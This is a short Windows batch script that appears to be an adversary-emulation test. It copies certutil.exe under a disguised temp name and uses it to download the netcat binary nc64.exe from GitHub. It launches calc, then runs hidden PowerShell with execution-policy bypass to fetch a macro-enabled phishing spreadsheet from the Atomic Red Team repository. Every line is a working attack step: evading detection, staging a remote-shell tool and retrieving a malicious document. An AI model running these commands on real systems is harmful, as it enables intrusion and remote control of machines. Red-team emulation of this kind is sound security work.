@echo on

copy %windir%\system32\certutil.exe %temp%\cr.tmp

%temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc64.exe




start calc

powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true', 'C:\tools\s.xlsm')"



